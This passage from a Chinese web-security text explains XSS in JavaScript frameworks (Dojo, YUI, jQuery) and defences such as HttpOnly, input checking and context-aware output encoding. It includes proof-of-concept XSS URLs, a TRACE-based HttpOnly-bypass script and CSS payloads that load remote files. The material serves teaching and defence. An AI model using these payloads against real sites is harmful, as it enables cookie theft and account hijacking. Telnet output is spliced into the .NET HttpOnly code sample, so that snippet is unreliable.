<p>Flash XSS往往被开发者所忽视。注入Flash变量的XSS，因为其问题出现在编译后的Flash文件中，一般的扫描工具或者代码审计工具都难以检查，常常使其成为漏网之鱼。<br>OWASP为Flash安全研究设立了一个Wiki页面，有兴趣的读者可以参考。</p>
<p> 3.2.9 真的高枕无忧吗：JavaScript开发框架</p>
<p>在Web前端开发中，一些JavaScript开发框架深受开发者欢迎。利用JavaScript开发框架中的各种强大功能，可以快速而简洁地完成前端开发。<br>一般来说，成熟的JavaScript开发框架都会注意自身的安全问题。但是代码是人写的，高手偶尔也会犯错。一些JavaScript开发框架也曾暴露过一些XSS漏洞。</p>
<p>DojoDojo是一个流行的JavaScript开发框架，它曾被发现存在XSS漏洞。在Dojo 1.4.1中，存在两个“DOM Based XSS”：<br>File: dojo-release-1.4.1-src\dojo-release-1.4.1-src\dijit\tests_testCommon.js<br>用户输入由theme参数传入，然后被赋值给变量themeCss，最终被document.write到页面里：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> str = <span class="built_in">window</span>.location.href.substr(<span class="built_in">window</span>.location.href.indexOf(<span class="string">"?"</span>)+<span class="number">1</span>).split(<span class="regexp">/#/</span>);</div><div class="line"><span class="keyword">var</span> themeCss = d.moduleUrl(<span class="string">"dijit.themes"</span>,theme+<span class="string">"/"</span>+theme+<span class="string">".css"</span>);</div><div class="line"><span class="keyword">var</span> themeCssRtl = d.moduleUrl(<span class="string">"dijit.themes"</span>,theme+<span class="string">"/"</span>+theme+<span class="string">"_rtl.css"</span>);</div><div class="line"><span class="built_in">document</span>.write(<span class="string">'&lt;link rel="stylesheet" type="text/css" href="'</span>+themeCss+<span class="string">'"&gt;'</span>);</div><div class="line"><span class="built_in">document</span>.write(<span class="string">'&lt;link rel="stylesheet" type="text/css" href="'</span>+themeCssRtl+<span class="string">'"&gt;'</span>);</div></pre></td></tr></table></figure>
<p>所以凡是引用了_testCommon.js的文件，都受影响。POC如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">http://WebApp/dijit/tests/form/test_Button.html?theme=&quot;/&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt;</div><div class="line">类似的问题还存在于：</div><div class="line"></div><div class="line">File: dojo-release-1.4.1-src\dojo-release-1.4.1-src\util\doh\runner.html</div><div class="line">它也是从window.location传入了用户能够控制的数据，最终被document.write到页面：</div><div class="line">Line 40:</div><div class="line">var qstr = window.location.search.substr(1);</div><div class="line"></div><div class="line"></div><div class="line">Line 64:</div><div class="line">document.write(&quot;&lt;scr&quot;+&quot;ipt type=&apos;text/javascript&apos; djConfig=&apos;isDebug: true&apos;</div><div class="line">src=&apos;&quot;+dojoUrl+&quot;&apos;&gt;&lt;/scr&quot;+&quot;ipt&gt;&quot;);</div><div class="line">..snip..</div><div class="line">document.write(&quot;&lt;scr&quot;+&quot;ipt type=&apos;text/javascript&apos; src=&apos;&quot;+testUrl+&quot;.js&apos;&gt;&lt;/scr&quot;+&quot;ipt&gt;&quot;);</div><div class="line">POC如下：</div><div class="line">http://WebApp/util/doh/runner.html?dojoUrl=&apos;/&gt;foo&lt;/script&gt;&lt;&apos;</div><div class="line">&quot;&lt;script&gt;alert(/xss/)&lt;/script&gt;</div></pre></td></tr></table></figure>
<p>这些问题在Dojo 1.4.2版本中已经得到修补。但是从这些漏洞可以看到，使用JavaScript开发框架也并非高枕无忧，需要随时关注可能出现的安全问题。</p>
<p><hr></p>
<h3 id="YUI"><a href="#YUI" class="headerlink" title="YUI"></a>YUI</h3><p>翻翻YUI的bugtracker，也可以看到类似Dojo的问题。</p>
<p>在YUI 2.8.1中曾经fix过一个“DOM Based XSS”。YUI的History Manager功能中有这样一个问题，打开官方的demo页：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">http://developer.yahoo.com/yui/examples/history/history-navbar_source.html</div></pre></td></tr></table></figure>
<p>点击一个Tab页，等待页面加载完成后，在URL的hash中插入恶意脚本。构造的XSS如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">http://developer.yahoo.com/yui/examples/history/history-navbar_source.html#navbar=hom</div><div class="line">e&lt;script&gt;alert(1)&lt;/script&gt;</div></pre></td></tr></table></figure>
<p>脚本将得到执行。其原因是在<code>history.js</code>的<code>_updateIframe</code>方法中信任了用户可控制的变量：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">html = &apos;&lt;html&gt;&lt;body&gt;&lt;div id=&quot;state&quot;&gt;&apos; + fqstate + &apos;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;;</div></pre></td></tr></table></figure>
<p>最后被写入到页面导致脚本执行。YUI的修补方案是对变量进行了htmlEscape。</p>
<p><hr></p>
<h3 id="jQuery"><a href="#jQuery" class="headerlink" title="jQuery"></a>jQuery</h3><p>jQuery可能是目前最流行的JavaScript框架。它本身出现的XSS漏洞很少。但是开发者应该记住的是，JavaScript框架只是对JavaScript语言本身的封装，并不能解决代码逻辑上产生的问题。所以开发者的意识才是安全编码的关键所在。<br>在jQuery中有一个html()方法。这个方法如果没有参数，就是读取一个DOM节点的innerHTML；如果有参数，则会把参数值写入该DOM节点的innerHTML中。这个过程中有可能产生</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">“DOM Based XSS”：$(&apos;div.demo-container&apos;).html(&quot;&lt;img src=# onerror=alert(1) /&gt;&quot;);</div></pre></td></tr></table></figure>
<p>如上，如果用户能够控制输入，则必然会产生XSS。在开发过程中需要注意这些问题。<br>使用JavaScript框架并不能让开发者高枕无忧，同样可能存在安全问题。除了需要关注框架本身的安全外，开发者还要提高安全意识，理解并正确地使用开发框架。</p>
<p><hr></p>
<h3 id="3-3-XSS的防御"><a href="#3-3-XSS的防御" class="headerlink" title="3.3 XSS的防御"></a>3.3 XSS的防御</h3><p>XSS的防御是复杂的。</p>
<p>流行的浏览器都内置了一些对抗XSS的措施，比如Firefox的CSP、Noscript扩展，IE 8内置的XSS Filter等。而对于网站来说，也应该寻找优秀的解决方案，保护用户不被XSS攻击。</p>
<p> 3.3.1 四两拨千斤：HttpOnly</p>
<p>HttpOnly</p>
<p>HttpOnly最早是由微软提出，并在IE 6中实现的，至今已经逐渐成为一个标准。浏览器将禁止页面的JavaScript访问带有HttpOnly属性的Cookie。<br>以下浏览器开始支持HttpOnly：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">Microsoft IE 6 SP1+</div><div class="line">Mozilla Firefox 2.0.0.5+</div><div class="line">Mozilla Firefox 3.0.0.6+</div><div class="line">Google Chrome</div><div class="line">Apple Safari 4.0+</div><div class="line">Opera 9.5+</div></pre></td></tr></table></figure>
<p>严格地说，HttpOnly并非为了对抗XSS——HttpOnly解决的是XSS后的Cookie劫持攻击。<br>在“初探XSS Payload”一节中，曾演示过“如何使用XSS窃取用户的Cookie，然后登录进该用户的账户”。但如果该Cookie设置了HttpOnly，则这种攻击会失败，因为JavaScript读取不到Cookie的值。<br>一个Cookie的使用过程如下。<br>Step1：浏览器向服务器发起请求，这时候没有Cookie。<br>Step2：服务器返回时发送Set-Cookie头，向客户端浏览器写入Cookie。Step3：在该Cookie到期前，浏览器访问该域下的所有页面，都将发送该Cookie。<br>HttpOnly是在Set-Cookie时标记的：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">Set-Cookie: &lt;name&gt;=&lt;value&gt;[; &lt;Max-Age&gt;=&lt;age&gt;]</div><div class="line">[; expires=&lt;date&gt;][; domain=&lt;domain_name&gt;]</div><div class="line">[; path=&lt;some_path&gt;][; secure][; HttpOnly]</div></pre></td></tr></table></figure>
<p>需要注意的是，服务器可能会设置多个Cookie（多个key-value对），而HttpOnly可以有选择性地加在任何一个Cookie值上。<br>在某些时候，应用可能需要JavaScript访问某几项Cookie，这种Cookie可以不设置HttpOnly标记；而仅把HttpOnly标记给用于认证的关键Cookie。<br>HttpOnly的使用非常灵活。如下是一个使用HttpOnly的过程。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">&lt;?php</div><div class="line"></div><div class="line">header(&quot;Set-Cookie: cookie1=test1;&quot;);</div><div class="line">header(&quot;Set-Cookie: cookie2=test2;httponly&quot;, false);</div><div class="line"></div><div class="line">?&gt;</div><div class="line"></div><div class="line">&lt;script&gt;</div><div class="line">  alert(document.cookie);</div><div class="line">&lt;/script&gt;</div></pre></td></tr></table></figure>
<p>在这段代码中，cookie1没有HttpOnly，cookie2被标记为HttpOnly。两个Cookie均被写入浏览器：测试页面的HTTP响应头<br>浏览器确实接收了两个Cookie：<br>浏览器接收到两个Cookie<br>但是只有cookie1被JavaScript读取到：<br>cookie1被JavaScript读取HttpOnly起到了应有的作用。</p>
<p>在不同的语言中，给Cookie添加HttpOnly的代码如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">Java EE</div><div class="line">response.setHeader(&quot;Set-Cookie&quot;, &quot;cookiename=value;  Path=/;Domain=domainvalue;Max-Ag</div><div class="line">e=seconds;HTTPOnly&quot;);</div><div class="line">C#</div><div class="line">HttpCookie myCookie = new HttpCookie(&quot;myCookie&quot;);</div><div class="line">myCookie.HttpOnly = true;</div><div class="line">Response.AppendCookie(myCookie);</div><div class="line">VB.NET</div><div class="line">Dim myCookie As HttpCookie = new HttpCookie(&quot;myCookie&quot;)</div><div class="line">myCookie.HttpOnly = True</div><div class="line">Response.AppendCookie(myCookie)</div><div class="line">但是在.NET 1.1中需要手动添加：$ telnet foo.com 80</div><div class="line">Trying 127.0.0.1...</div><div class="line">Connected to foo.bar.</div><div class="line">Escape character is ‘^]’.</div><div class="line">TRACE / HTTP/1.1</div><div class="line">Host: foo.bar</div><div class="line">X-Header: test</div><div class="line"></div><div class="line"></div><div class="line">HTTP/1.1 200 OK</div><div class="line">Date: Mon, 02 Dec 2002 19:24:51 GMT</div><div class="line">Server: Apache/2.0.40 (Unix)</div><div class="line">Content-Type: message/http</div><div class="line"></div><div class="line">TRACE / HTTP/1.1</div><div class="line">Host: foo.bar</div><div class="line">X-Header: test</div><div class="line">Response.Cookies[cookie].Path += &quot;;HTTPOnly&quot;;PHP 4</div><div class="line">header(&quot;Set-Cookie: hidden=value; httpOnly&quot;);</div><div class="line">PHP 5</div><div class="line">setcookie(&quot;abc&quot;, &quot;test&quot;, NULL, NULL, NULL, NULL, TRUE);</div></pre></td></tr></table></figure>
<p>最后一个参数为HttpOnly属性。<br>添加HttpOnly的过程简单，效果明显，有如四两拨千斤。但是在部署时需要注意，如果业务非常复杂，则需要在所有Set-Cookie的地方，给关键Cookie都加上HttpOnly。漏掉了一个地方，都可能使得这个方案失效。<br>在过去几年中，曾经出现过一些能够绕过HttpOnly的攻击方法。Apache支持的一个Header是TRACE。TRACE一般用于调试，它会将请求头作为HTTP Response Body返回。</p>
<p>利用这个特性，可以把HttpOnly Cookie读出来。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">&lt;script type=&quot;text/javascript&quot;&gt;</div><div class="line">&lt;!--</div><div class="line">function sendTrace () &#123;</div><div class="line">    var xmlHttp = new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);</div><div class="line">    xmlHttp.open(&quot;TRACE&quot;, &quot;http://foo.bar&quot;,false);</div><div class="line">    xmlHttp.send();</div><div class="line">    xmlDoc=xmlHttp.responseText;</div><div class="line">    alert(xmlDoc);</div><div class="line">&#125;</div><div class="line">//--&gt;</div><div class="line">&lt;/script&gt;</div><div class="line">&lt;INPUT TYPE=BUTTON OnClick=&quot;sendTrace();&quot; VALUE=&quot;Send Trace Request&quot;&gt;</div></pre></td></tr></table></figure>
<p>结果如下：JavaScript读取到cookie<br>目前各厂商都已经修补了这些漏洞，但是未来也许还会有新的漏洞出现。现在业界给关键业务添加HttpOnly Cookie已经成为一种“标准”的做法。<br>但是，HttpOnly不是万能的，添加了HttpOnly不等于解决了XSS问题。<br>XSS攻击带来的不光是Cookie劫持问题，还有窃取用户信息、模拟用户身份执行操作等诸多严重的后果。如前文所述，攻击者利用AJAX构造HTTP请求，以用户身份完成的操作，就是在不知道用户Cookie的情况下进行的。<br>使用HttpOnly有助于缓解XSS攻击，但仍然需要其他能够解决XSS漏洞的方案。</p>
<p><hr></p>
<h3 id="3-3-2-输入检查"><a href="#3-3-2-输入检查" class="headerlink" title="3.3.2 输入检查"></a>3.3.2 输入检查</h3><p>输入检查</p>
<p>常见的Web漏洞如XSS、SQL Injection等，都要求攻击者构造一些特殊字符，这些特殊字符可能是正常用户不会用到的，所以输入检查就有存在的必要了。<br>输入检查，在很多时候也被用于格式检查。例如，用户在网站注册时填写的用户名，会被要求只能为字母、数字的组合。比如“hello1234”是一个合法的用户名，而“hello#$^”就是一个非法的用户名。<br>又如注册时填写的电话、邮件、生日等信息，都有一定的格式规范。比如手机号码，应该是不长于16位的数字，且中国大陆地区的手机号码可能是13x、15x开头的，否则即为非法。<br>这些格式检查，有点像一种“白名单”，也可以让一些基于特殊字符的攻击失效。<br>输入检查的逻辑，必须放在服务器端代码中实现。如果只是在客户端使用JavaScript进行输入检查，是很容易被攻击者绕过的。目前Web开发的普遍做法，是同时在客户端JavaScript中和服务器端代码中实现相同的输入检查。客户端JavaScript的输入检查，可以阻挡大部分误操作的正常用户，从而节约服务器资源。<br>在XSS的防御上，输入检查一般是检查用户输入的数据中是否包含一些特殊字符，如&lt;、&gt;、’、”等。如果发现存在特殊字符，则将这些字符过滤或者编码。<br>比较智能的“输入检查”，可能还会匹配XSS的特征。比如查找用户数据中是否包含了<code>&lt;script&gt;</code> 、<code>javascript</code> 等敏感字符。<br>这种输入检查的方式，可以称为<code>XSS Filter</code>。互联网上有很多开源的<code>XSS Filter</code>的实现。</p>
<p>XSS Filter在用户提交数据时获取变量，并进行XSS检查；但此时用户数据并没有结合渲染页面的HTML代码，因此XSS Filter对语境的理解并不完整。<br>比如下面这个XSS漏洞：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">&lt;script src=&quot;$var&quot; &gt;&lt;/script&gt;</div></pre></td></tr></table></figure>
<p>其中<code>$var</code>是用户可以控制的变量。用户只需要提交一个恶意脚本所在的URL地址，即可实施XSS攻击。</p>
<p>如果是一个<code>全局性的XSS Filter</code>，则无法看到用户数据的输出语境，而只能看到用户提交了一个URL，就很可能会漏报。因为在大多数情况下，URL是一种合法的用户数据。</p>
<p>XSS Filter还有一个问题——其对“&lt;”、“&gt;”等字符的处理，可能会改变用户数据的语义。</p>
<p>对于XSS Filter来说，发现了敏感字符“&lt;”。如果XSS Filter不够“智能”，粗暴地过滤或者替换了“&lt;”，则可能会改变用户原本的意思。<br>输入数据，还可能会被展示在多个地方，每个地方的语境可能各不相同，如果使用单一的替换操作，则可能会出现问题。</p>
<p><hr></p>
<h3 id="3-3-3-输出检查"><a href="#3-3-3-输出检查" class="headerlink" title="3.3.3 输出检查"></a>3.3.3 输出检查</h3><p>一般来说，除了富文本的输出外，在变量输出到HTML页面时，可以使用编码或转义的方式来防御XSS攻击。</p>
<p>编码分为很多种，针对HTML代码的编码方式是<code>HtmlEncode</code>。<br><code>HtmlEncode</code>并非专用名词，它只是一种函数实现。它的作用是将字符转换成<code>HTMLEntities</code>，对应的标准是ISO-8859-1。<br>为了对抗XSS，在HtmlEncode中要求至少转换以下字符：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">&amp; --&gt; &amp;amp;</div><div class="line">&lt; --&gt; &amp;lt;</div><div class="line">&gt; --&gt; &amp;gt;</div><div class="line">&gt; &quot; --&gt; &amp;quot;</div><div class="line">&gt; &apos; --&gt; &amp;#x27;　　 &amp;apos; 不推荐</div><div class="line">&gt; / --&gt; &amp;#x2F;　　 包含反斜线是因为它可能会闭合一些HTML entity</div><div class="line">&gt; 在PHP中，有htmlentities()和htmlspecialchars()两个函数可以满足安全要求。</div><div class="line">&gt; 相应地，JavaScript的编码方式可以使用JavascriptEncode。</div><div class="line">&gt; JavascriptEncode与HtmlEncode的编码方法不同，它需要使用“\”对特殊字符进行转义。在对抗XSS时，还要求输出的变量必须在引号内部，以避免造成安全问题。比较下面两种写法：</div><div class="line">&gt; var x = escapeJavascript($evil);</div><div class="line"></div><div class="line">var y = &apos;&quot;&apos;+escapeJavascript($evil)+&apos;&quot;&apos;;</div><div class="line">如果escapeJavascript()函数只转义了几个危险字符，比如‘、”、&lt;、&gt;、\、&amp;、#等，那么上面的两行代码输出后可能会变成：</div><div class="line">var x = 1;alert(2);</div><div class="line"></div><div class="line">var y = &quot;1;alert(2)&quot;;</div><div class="line">第一行执行额外的代码了；第二行则是安全的。对于后者，攻击者即使想要逃逸出引号的范围，也会遇到困难：</div><div class="line">var y = &quot;\&quot;;alert(1);\/\/&quot;;</div><div class="line">所以要求使用JavascriptEncode的变量输出一定要在引号内。</div><div class="line">可是很多开发者没有这个习惯怎么办？这就只能使用一个更加严格的JavascriptEncode函数来保证安全——除了数字、字母外的所有字符，都使用十六进制“\xHH”的方式进行编码。在本例中：</div><div class="line">var x = 1;alert(2);</div><div class="line">变成了：</div><div class="line">var x = 1\x3balert\x282\x29;如此代码可以保证是安全的。</div><div class="line">在OWASP ESAPI中有一个安全的JavascriptEncode的实现，非常严格。</div><div class="line">        /**</div><div class="line">         * &#123;@inheritDoc&#125;</div><div class="line">         *</div><div class="line">         * Returns backslash encoded numeric format. Does not use backslash character escapes</div><div class="line">         * such as, \&quot; or \&apos; as these may cause parsing problems. For example, if a javascript</div><div class="line">         * attribute, such as onmouseover, contains a \&quot; that will close the entire attribute and</div><div class="line">         * allow an attacker to inject another script attribute.</div><div class="line">     *</div><div class="line">     * @param immune</div><div class="line">     */</div><div class="line">        public String encodeCharacter( char[] immune, Character c ) &#123;</div><div class="line"></div><div class="line">                // check for immune characters</div><div class="line">                if ( containsCharacter(c, immune ) ) &#123;</div><div class="line">                        return &quot;&quot;+c;</div><div class="line">                &#125;</div><div class="line"></div><div class="line">                // check for alphanumeric characters</div><div class="line">                String hex = Codec.getHexForNonAlphanumeric(c);</div><div class="line">                if ( hex == null ) &#123;</div><div class="line">                        return &quot;&quot;+c;</div><div class="line">                &#125;</div><div class="line"></div><div class="line">                // Do not use these shortcuts as they can be used to break out of a context</div><div class="line">                // if ( ch == 0x00 ) return &quot;\\0&quot;;</div><div class="line">                // if ( ch == 0x08 ) return &quot;\\b&quot;;</div><div class="line">                // if ( ch == 0x09 ) return &quot;\\t&quot;;</div><div class="line">                // if ( ch == 0x0a ) return &quot;\\n&quot;;</div><div class="line">                // if ( ch == 0x0b ) return &quot;\\v&quot;;</div><div class="line">                // if ( ch == 0x0c ) return &quot;\\f&quot;;</div><div class="line">                // if ( ch == 0x0d ) return &quot;\\r&quot;;</div><div class="line">                // if ( ch == 0x22 ) return &quot;\\\&quot;&quot;;</div><div class="line">                // if ( ch == 0x27 ) return &quot;\\&apos;&quot;;</div><div class="line">                // if ( ch == 0x5c ) return &quot;\\\\&quot;;</div><div class="line"></div><div class="line">                // encode up to 256 with \\xHH</div><div class="line">        String temp = Integer.toHexString(c);</div><div class="line">                if ( c &lt; 256 ) &#123;</div><div class="line">                String pad = &quot;00&quot;.substring(temp.length() );</div><div class="line">                return &quot;\\x&quot; + pad + temp.toUpperCase();</div><div class="line">                &#125;</div><div class="line"></div><div class="line">                // otherwise encode with \\uHHHH</div><div class="line">        String pad = &quot;0000&quot;.substring(temp.length() );</div><div class="line">        return &quot;\\u&quot; + pad + temp.toUpperCase();</div><div class="line">        &#125;</div></pre></td></tr></table></figure>
<p>除了HtmlEncode、JavascriptEncode外，还有许多用于各种情况的编码函数，比如XMLEncode（其实现与HtmlEncode类似）、JSONEncode（与JavascriptEncode类似）等。<br>在“Apache Common Lang”的“StringEscapeUtils”里，提供了许多escape的函数。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">import org.apache.commons.lang.StringEscapeUtils;</div><div class="line"></div><div class="line">public class StringUtilsEscapeExampleV1 &#123;</div><div class="line"></div><div class="line">  public static void main(String args[]) &#123;</div><div class="line">    String unescapedJava = &quot;Are you for real?&quot;;</div><div class="line">    System.err.println(StringEscapeUtils.escapeJava(unescapedJava));</div><div class="line"></div><div class="line">    String unescapedJavaScript = &quot;What&apos;s in a name?&quot;;</div><div class="line">    System.err.println(StringEscapeUtils.escapeJavaScript(unescapedJavaScript));</div><div class="line"></div><div class="line">    String unescapedSql = &quot;Mc&apos;Williams&quot;;</div><div class="line">    System.err.println(StringEscapeUtils.escapeSql(unescapedSql));</div><div class="line"></div><div class="line">    String unescapedXML = &quot;&lt;data&gt;&quot;;</div><div class="line">    System.err.println(StringEscapeUtils.escapeXml(unescapedXML));</div><div class="line"></div><div class="line">    String unescapedHTML = &quot;&lt;data&gt;&quot;;</div><div class="line">    System.err.println(StringEscapeUtils.escapeHtml(unescapedHTML));</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>可以在适当的情况下选用适当的函数。需要注意的是，编码后的数据长度可能会发生改变，从而影响某些功能。在写代码时需要注意这个细节，以免产生不必要的bug。</p>
<p>只需一种编码吗<br>XSS攻击主要发生在MVC架构中的View层。大部分的XSS漏洞可以在模板系统中解决。<br>在Python的开发框架Django自带的模板系统“Django Templates”中，可以使用escape进行HtmlEncode。比如：</p>
<p><kbd> { { var|escape }} </kbd></p>
<p>这样写的变量，会被HtmlEncode编码。<br>这一特性在Django 1.0中得到了加强——默认所有的变量都会被escape。这个做法是值得称道的，它符合“Secure By Default”原则。<br>在Python的另一个框架web2py中，也默认escape了所有的变量。在web2py的安全文档中，有这样一句话：</p>
<p><kbd> web2py, by default, escapes all variables rendered in the view, thus preventing XSS. </kbd></p>
<p>Django和web2py都选择在View层默认HtmlEncode所有变量以对抗XSS，出发点很好。但是，像web2py这样认为这就解决了XSS问题，是错误的观点。</p>
<p>XSS是很复杂的问题，需要“在正确的地方使用正确的编码方式”。看看下面这个例子：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">#</span> <span class="attr">onclick</span>=<span class="string">"alert('$var');"</span> &gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span>开发者希望看到的效果是，用户点击链接后，弹出变量“$var”的内容。可是用户如果输入：</div><div class="line">$var = htmlencode("');alert('2");</div><div class="line">对变量“$var”进行HtmlEncode后，渲染的结果是：</div><div class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">#</span> <span class="attr">onclick</span>=<span class="string">"alert('&amp;#x27;&amp;#x29;&amp;#x3b;alert&amp;#x28;&amp;#x27;2');"</span> &gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></div><div class="line">对于浏览器来说，htmlparser会优先于JavaScript Parser执行，所以解析过程是，被HtmlEncode的字符先被解码，然后执行JavaScript事件。</div><div class="line">因此，经过htmlparser解析后相当于：</div><div class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">#</span> <span class="attr">onclick</span>=<span class="string">"alert('');alert('2');"</span> &gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></div></pre></td></tr></table></figure>
<p>成功在onclick事件中注入了XSS代码！</p>
<p>第一次弹框：</p>
<p>执行第一个alert</p>
<p>第二次弹框：执行第二个alert</p>
<p>导致XSS攻击发生的原因，是由于没有分清楚输出变量的语境！因此并非在模板引擎中使用了auto-escape就万事大吉了，XSS的防御需要区分情况对待。</p>
<p><hr></p>
<h3 id="3-3-4-正确地防御XSS"><a href="#3-3-4-正确地防御XSS" class="headerlink" title="3.3.4 正确地防御XSS"></a>3.3.4 正确地防御XSS</h3><p>正确地防御XSS</p>
<p>为了更好地设计XSS防御方案，需要认清XSS产生的本质原因。<br>XSS的本质还是一种“HTML注入”，用户的数据被当成了HTML代码一部分来执行，从而混淆了原本的语义，产生了新的语义。<br>如果网站使用了MVC架构，那么XSS就发生在View层——在应用拼接变量到HTML页面时产生。所以在用户提交数据处进行输入检查的方案，其实并不是在真正发生攻击的地方做防御。<br>想要根治XSS问题，可以列出所有XSS可能发生的场景，再一一解决。<br>下面将用变量“$var”表示用户数据，它将被填充入HTML代码中。可能存在以下场景。<br>在HTML标签中输出</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">&lt;div&gt;$var&lt;/div&gt;</div><div class="line">&lt;a href=# &gt;$var&lt;/a&gt;</div></pre></td></tr></table></figure>
<p>所有在标签中输出的变量，如果未做任何处理，都能导致直接产生XSS。<br>在这种场景下，XSS的利用方式一般是构造一个<code>&lt;script&gt;</code>标签，或者是任何能够产生脚本执行的方式。比如</p>
<figure class="highlight html"><table><tr><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="regexp">/xss/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div></pre></td></tr></table></figure>
<p>或者</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">&lt;a href=# &gt;&lt;img src=# onerror=alert(1) /&gt;&lt;/a&gt;</div></pre></td></tr></table></figure>
<p>防御方法是对变量使用HtmlEncode。<br>在HTML属性中输出</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">&lt;div id=&quot;abc&quot; name=&quot;$var&quot; &gt;&lt;/div&gt;</div></pre></td></tr></table></figure>
<p>与在HTML标签中输出类似，可能的攻击方法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">&lt;div id=&quot;abc&quot; name=&quot;&quot;&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt;&lt;&quot;&quot; &gt;&lt;/div&gt;</div></pre></td></tr></table></figure>
<p>防御方法也是采用HtmlEncode。<br>在OWASP ESAPI中推荐了一种更严格的HtmlEncode——除了字母、数字外，其他所有的特殊字符都被编码成HTMLEntities。<br>String safe = ESAPI.encoder().encodeForHTMLAttribute( request.getParameter( “input” ) );<br>这种严格的编码方式，可以保证不会出现任何安全问题。</p>
<p>在<code>&lt;script&gt;</code>标签中输出</p>
<p>在<code>&lt;script&gt;</code>标签中输出时，首先应该确保输出的变量在引号中：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">&lt;script&gt;</div><div class="line">var x = &quot;$var&quot;;</div><div class="line">&lt;/script&gt;</div></pre></td></tr></table></figure>
<p>攻击者需要先闭合引号才能实施XSS攻击：<script></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">var x = &quot;&quot;;alert(/xss/);//&quot;;</div><div class="line">&lt;/script&gt;</div></pre></td></tr></table></figure>
<p>防御时使用JavascriptEncode。<br>在事件中输出<br>在事件中输出和在<code>&lt;script&gt;</code>标签中输出类似：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">&lt;a href=# onclick=&quot;funcA(&apos;$var&apos;)&quot; &gt;test&lt;/a&gt;</div></pre></td></tr></table></figure>
<p>可能的攻击方法：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">#</span> <span class="attr">onclick</span>=<span class="string">"funcA('');alert(/xss/);//')"</span> &gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></div></pre></td></tr></table></figure>
<p>在防御时需要使用JavascriptEncode。<br>在CSS中输出<br>在CSS和style、style attribute中形成XSS的方式非常多样化，参考下面几个XSS的例子。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">STYLE</span>&gt;</span><span class="undefined">@import'http://ha.ckers.org/xss.css';</span><span class="tag">&lt;/<span class="name">STYLE</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">STYLE</span>&gt;</span><span class="css"><span class="selector-tag">BODY</span>&#123;<span class="attribute">-moz-binding</span>:<span class="built_in">url</span>(<span class="string">"http://ha.ckers.org/xssmoz.xml#xss"</span>)&#125;</span><span class="tag">&lt;/<span class="name">STYLE</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">XSS</span> <span class="attr">STYLE</span>=<span class="string">"behavior: url(xss.htc);"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">STYLE</span>&gt;</span><span class="css"><span class="selector-tag">li</span> &#123;<span class="attribute">list-style-image</span>: <span class="built_in">url</span>(<span class="string">"javascript:alert('XSS')"</span>);&#125;</span><span class="tag">&lt;/<span class="name">STYLE</span>&gt;</span><span class="tag">&lt;<span class="name">UL</span>&gt;</span><span class="tag">&lt;<span class="name">LI</span>&gt;</span>XSS</div><div class="line"><span class="tag">&lt;<span class="name">DIV</span> <span class="attr">STYLE</span>=<span class="string">"background-image: url(javascript:alert('XSS'))"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">DIV</span> <span class="attr">STYLE</span>=<span class="string">"width: expression(alert('XSS'));"</span>&gt;</span></div></pre></td></tr></table></figure>
<p>所以，一般来说，尽可能禁止用户可控制的变量在“<style>标签”、“HTML标签的style属性”以及“CSS文件”中输出。如果一定有这样的需求，则推荐使用OWASP ESAPI中的encodeForCSS()函数。</p>
